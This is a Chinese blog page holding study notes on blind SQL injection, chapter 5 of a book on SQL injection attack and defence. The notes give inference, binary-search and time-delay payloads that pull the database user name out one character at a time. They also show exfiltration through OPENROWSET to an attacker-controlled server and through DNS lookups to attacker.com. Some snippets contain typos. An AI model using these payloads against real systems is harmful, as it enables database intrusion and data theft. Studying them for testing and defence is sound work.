@@ -1,0 +1,853 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+  <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.css" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+  
+
+<link href="//cdn.bootcss.com/font-awesome/4.4.0/fonts/fontawesome-webfont.svg" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="安全,sql注入," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/favicon.ico?v=5.0.1" />
+
+
+
+
+
+
+<meta name="description" content="sql盲注是指在无法使用详细数据库错误消息或带内数据连接的情况下，利用数据库查询的输入审查漏洞从数据库提取信息或提取与数据库查询相关信息的攻击技术。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Sql注入攻击与防御总结：第5章 sql盲注利用">
+<meta property="og:url" content="http://www.fatiao.site/anquan_sqlinj25.html">
+<meta property="og:site_name" content="小发条的技术人生">
+<meta property="og:description" content="sql盲注是指在无法使用详细数据库错误消息或带内数据连接的情况下，利用数据库查询的输入审查漏洞从数据库提取信息或提取与数据库查询相关信息的攻击技术。">
+<meta property="og:updated_time" content="2016-09-29T07:46:59.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Sql注入攻击与防御总结：第5章 sql盲注利用">
+<meta name="twitter:description" content="sql盲注是指在无法使用详细数据库错误消息或带内数据连接的情况下，利用数据库查询的输入审查漏洞从数据库提取信息或提取与数据库查询相关信息的攻击技术。">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Pisces',
+    sidebar: {"position":"left","display":"post"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 0,
+      author: '博主'
+    }
+  };
+</script>
+
+
+
+
+  <link rel="canonical" href="http://www.fatiao.site/anquan_sqlinj25.html"/>
+
+  <title> 安全,sql注入, - Sql注入攻击与防御总结：第5章 sql盲注利用 | 小发条的技术人生 </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+  <script type="text/javascript">
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//tajs.qq.com/stats?sId=58555379";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">小发条的技术人生</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle">测试攻城狮 pythoner 伪程序猿一枚</p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                Sql注入攻击与防御总结：第5章 sql盲注利用
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2011-08-17T00:00:00+08:00" content="2011-08-17">
+              2011-08-17
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/安全/" itemprop="url" rel="index">
+                    <span itemprop="name">安全</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/anquan_sqlinj25.html#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="anquan_sqlinj25.html" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+             <span id="/anquan_sqlinj25.html" class="leancloud_visitors" data-flag-title="Sql注入攻击与防御总结：第5章 sql盲注利用">
+               &nbsp; | &nbsp;
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               <span class="post-meta-item-text">阅读次数 </span>
+               <span class="leancloud-visitors-count"></span>
+              </span>
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>sql盲注是指在无法使用详细数据库错误消息或带内数据连接的情况下，利用数据库查询的输入审查漏洞从数据库提取信息或提取与数据库查询相关信息的攻击技术。</p>
+<a id="more"></a>
+<ol>
+<li><p>寻找并确认sql盲注</p>
+<p>要想利用sql盲注漏洞，必须首先定位目标应用程序中潜在的易受攻击点并验证sql注入可行</p>
+<ol>
+<li><p>强制产生通用错误</p>
+<p>url中输入 · ，如果页面出现通用错误页面，攻击成功性很大</p>
+</li>
+<li><p>注入带副作用的查询</p>
+<p>计时攻击 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sql server  waitfor delay &apos;0:0:5&apos;</div><div class="line">mysql  sleep</div></pre></td></tr></table></figure>
+</li>
+<li><p>拆分与平衡</p>
+<p>分解合法的操作陈伟拆i包含不平衡的结尾单引号</p>
+<p>基本思想是：收集合法的请求参数，之后使用sql关键字对他们进行修改以保证与原始数据不同，但当数据库解析他们的时候，二者的功能是等价的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">id=5  拆分为 id=2+3</div><div class="line">name=&apos;bob&apos;   拆分  name=&apos;bo&apos;+&apos;b&apos;  或 &apos;bo&apos;||&apos;b&apos;</div><div class="line">mysql不允许拆分，因为没有二进制字符串联结运算符</div><div class="line">​</div><div class="line"></div><div class="line">sqlserver</div><div class="line">author=&apos;MadBob&apos;</div><div class="line">author=&apos;Mad&apos;+char(0x42)+&apos;ob&apos;</div><div class="line">author=&apos;Mad&apos;+select(B)+&apos;ob&apos;</div><div class="line">author=&apos;Mad&apos;+(select(&apos;B&apos;))+&apos;ob&apos;</div><div class="line">author=&apos;Mad&apos;+(select&apos;&apos;&apos;)+&apos;Bob&apos;</div></pre></td></tr></table></figure>
+<p>​</p>
+</li>
+<li><p>常见的盲注场景</p>
+<ol>
+<li>提交一个导致sql查询无效的漏洞时会返回一个通用的错误页面，而提交正确的sql时会返回一个内容可被适度控制的页面</li>
+<li>提交一个导致sql查询无效的漏洞时会返回一个通用的错误页面，而提交正确的sql时会返回一个内容不可控的页面</li>
+<li>提交受损或不正确sql既不会产生错误页面，也不会以任何方式影响页面输出。(盲注场景不返回错误， 而基于时间的漏洞或产生带外副作用的漏洞则最有可能成功识别易受攻击的参数)</li>
+</ol>
+</li>
+<li><p>sql盲注技术</p>
+<ul>
+<li><p>推断攻击技术</p>
+<p>描述了一些列攻击，他们使用sql提出关于数据库的问题并通过推断一次一位地逐步提取信息</p>
+</li>
+<li><p>带外通道技术</p>
+<p>通过可用的带外通道并使用某些机制来直接提取大块信息</p>
+</li>
+</ul>
+<ol>
+<li><p>推断攻击技术</p>
+<p>所有的推断攻击技术均可通过观察指定请求的响应来提取至少一位信息。当请求为0或1时，是否会有不同响应。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">http://url/c.aspx?status=incubating</div><div class="line">select count(chick_id) from chickens where status=&apos;incubating&apos;</div><div class="line">select count(chick_id) from chickens where status=&apos;incubating&apos; and substring(system_user,1,1)=&apos;a</div><div class="line">-- 询问用户的第一个字母是否为a</div><div class="line">incubating&apos; and substring(system_user,1,1)=&apos;a  false</div><div class="line">incubating&apos; and substring(system_user,1,1)=&apos;b  false</div><div class="line">incubating&apos; and substring(system_user,1,1)=&apos;c  false</div><div class="line">incubating&apos; and substring(system_user,1,1)=&apos;s  true</div><div class="line">​</div><div class="line">    </div><div class="line">incubating&apos; and substring(system_user,2,1)=&apos;s  false </div><div class="line">-- 从第二个字符开始</div><div class="line">incubating&apos; and len(system_user)=1  false  判断用户名长度</div></pre></td></tr></table></figure>
+</li>
+</ol>
+</li>
+</ol>
+</li>
+</ol>
+<pre><code>   ​
+
+2. 增加推断攻击技术的复杂性
+
+   1. 逐位法
+
+   2. 二分搜索
+
+      主要用于推断单个字节的值，不需要搜索整张字母表。通过将256分成两部分来判断。 127，63，31，15，7 
+
+      <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">incubating&apos; and ascii(substring(system_user,1,1))&gt;127 -- 上面一个例子的优化</div></pre></td></tr></table></figure>
+
+
+      ​
+
+3. 非主流通道技术
+
+   推断攻击技术依靠的是易收攻击页面发送的响应，而非主流通道技术使用的传输通道非页面响应，它的通道包括dns，e-mail,http请求。
+
+   特点：支持一次检索多块数据，而不是推断单个位或单个字节的值。
+
+​
+</code></pre><ol>
+<li><p>使用基于时间的技术</p>
+<p>延迟数据库查询</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">mysql</div><div class="line"><span class="keyword">select</span> <span class="keyword">sleep</span>(<span class="number">4.17</span>) <span class="keyword">as</span> <span class="string">'lalala'</span>;</div><div class="line"><span class="keyword">select</span> <span class="keyword">benchmark</span>(<span class="number">100000000</span>,<span class="keyword">rand</span>()) <span class="comment">-- 对于没有sleep函数的数据库</span></div><div class="line"></div><div class="line"><span class="number">1.</span> 通用mysql二分搜索推断漏洞  </div><div class="line">字符串注入点</div><div class="line"><span class="string">'union select if(ascii(substring((...),i,1))&gt;k,sleep(1),1)#  </span></div><div class="line">'<span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">if</span>(<span class="keyword">ascii</span>(<span class="keyword">substring</span>((...),i,<span class="number">1</span>))&gt;k,<span class="keyword">benchmark</span>(<span class="number">100000000</span>,<span class="keyword">rand</span>()),<span class="number">1</span>)#</div><div class="line"></div><div class="line">数字注入点</div><div class="line">+ <span class="keyword">if</span>(<span class="keyword">ascii</span>(<span class="keyword">substring</span>((...),i,<span class="number">1</span>))&gt;k,<span class="keyword">sleep</span>(<span class="number">5</span>),<span class="number">1</span>)#  </div><div class="line">+ <span class="keyword">if</span>(<span class="keyword">ascii</span>(<span class="keyword">substring</span>((...),i,<span class="number">1</span>))&gt;k,<span class="keyword">benchmark</span>(<span class="number">100000000</span>,<span class="keyword">rand</span>()),<span class="number">1</span>)#</div><div class="line"></div><div class="line"><span class="number">2.</span> 通用的mysql逐位推断漏洞</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">postgresql</div><div class="line">select * from reviews where review_author=&quot;madbob&quot;; select case 1 when 1 then pg_sleep(1) end;</div></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sqlserver</div><div class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> reviews <span class="keyword">where</span> review_author=<span class="string">'madbob'</span>;</div><div class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> reviews <span class="keyword">where</span> review_author=<span class="string">'madbob'</span>; if system_user='sa' waitfor delay '00:00:05'</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">begin dbms_lock.sleep(100);end;</div></pre></td></tr></table></figure>
+<p>​</p>
+</li>
+<li><p>使用基于响应的技术</p>
+<p>当检查的位为1时，查询返回结果，为0时则不返回结果；或者反过来</p>
+<p>​</p>
+</li>
+<li><p>使用非主流通道</p>
+<ol>
+<li><p>数据库连接</p>
+<p>针对sqlserver，攻击者通过它来创建从受害者数据库到攻击者数据库的链接，并通过该连接传递查询的数据。使用openrowset命令实现。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> openrowset(<span class="string">'sqloledb'</span>,<span class="string">'network=dbmsocn;address=10.0.2.2;uid=sa;pwd=Mypassword'</span>,<span class="string">'select review_author from reviews'</span>)</div><div class="line"></div><div class="line"><span class="keyword">insert</span> <span class="keyword">into</span> openrowset(<span class="string">'sqloledb'</span>,<span class="string">'network=dbmsocn;address=10.0.2.2;uid=foo;pwd=password'</span>,<span class="string">'select * from attacker_table'</span>) <span class="keyword">select</span> <span class="keyword">name</span> <span class="keyword">from</span> sysobjects <span class="keyword">where</span> xtype=<span class="string">'U'</span></div></pre></td></tr></table></figure>
+<p>​</p>
+</li>
+<li><p>dns渗透</p>
+<p>postgresql，sqlserver,oracle都能直接或间接引发dns请求。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">在oracle中可以使用 utl_inaddr包</div><div class="line">utl_inaddr.get_host_address(&apos;www.vicim.com&apos;)  — 返回192.168.1.100</div><div class="line">utl_inaddr.get_host_name(&apos;192.168.1.100&apos;)  — 返回 www.victim.com</div><div class="line">select * from reviews where review_author=utl——inaddr.get_host_address((select user from dual))|| &apos;.addacker.com&apos;)  — 通过谓词插入来提取数据库登录用例</div><div class="line"></div><div class="line">postgresql不支持直接查找，但是可以通过其xml解析库的一个小技巧来初始化dbs</div><div class="line">select xmlparse(document &apos;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ios-8859-1&quot;?&gt;&lt;!doctype x [!element x any&gt;&lt;!entity xx system &quot;hyyp://&apos;||user||&apos;attacker.com./&quot;&gt;]&lt;x&gt;&amp;xx;&lt;/x&gt;&apos;);</div><div class="line">只要postgresql安装了dblink，在链接字符串中就可以制定一个主机名以引发一次dns查询</div></pre></td></tr></table></figure>
+<p>​</p>
+</li>
+<li><p>e-mail渗漏</p>
+</li>
+<li><p>http渗漏</p>
+</li>
+<li><p>icmp渗漏</p>
+</li>
+</ol>
+</li>
+</ol>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+  <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+    <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
+    <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+      <span>赏</span>
+    </button>
+    <div id="QR" style="display: none;">
+      
+        <div id="wechat" style="display: inline-block">
+          <img id="wechat_qr" src="/images/wechatpay01.jpg" alt="发条橙子 WeChat Pay"/>
+          <p>微信打赏</p>
+        </div>
+      
+      
+    </div>
+  </div>
+
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/安全/" rel="tag">#安全</a>
+          
+            <a href="/tags/sql注入/" rel="tag">#sql注入</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/anquan_sqlinj23.html" rel="next" title="Sql注入攻击与防御总结：第3章 复查代码中的SQL注入">
+                <i class="fa fa-chevron-left"></i> Sql注入攻击与防御总结：第3章 复查代码中的SQL注入
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/anquan_sqlinj26.html" rel="prev" title="Sql注入攻击与防御总结：第6章 利用操作系统">
+                Sql注入攻击与防御总结：第6章 利用操作系统 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div class="ds-thread" data-thread-key="anquan_sqlinj25.html"
+           data-title="Sql注入攻击与防御总结：第5章 sql盲注利用" data-url="http://www.fatiao.site/anquan_sqlinj25.html">
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.jpg"
+               alt="发条橙子" />
+          <p class="site-author-name" itemprop="name">发条橙子</p>
+          <p class="site-description motion-element" itemprop="description">不积跬步，无以至千里</p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">99</span>
+              <span class="site-state-item-name">日志</span>
+            </a>
+          </div>
+
+          
+            <div class="site-state-item site-state-categories">
+              <a href="/categories">
+                <span class="site-state-item-count">11</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">29</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <p class="post-toc-empty">此文章未包含目录</p>
+            
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy;  2009 - 
+  <span itemprop="copyrightYear">2016</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">发条橙子</span>
+</div>
+
+<!--
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Pisces
+  </a>
+</div>
+-->
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.3/jquery.min.js"></script>
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js"></script>
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/jquery_lazyload/1.9.7/jquery.lazyload.min.js"></script>
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/velocity/1.2.1/velocity.min.js"></script>
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/velocity/1.2.1/velocity.ui.min.js"></script>
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.pack.js"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.0.1"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.0.1"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.1"></script>
+
+
+
+  
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"ftcz"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.id = 'duoshuo-script';
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+
+  
+
+
+
+
+
+
+  
+  
+
+  
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
+  <script>AV.initialize("E68bJY5qtsLfglErhVHLcN8w-gzGzoHsz", "Wjc3t8GBeMfc0xUJJi0JiWaW");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+</body>
+</html>
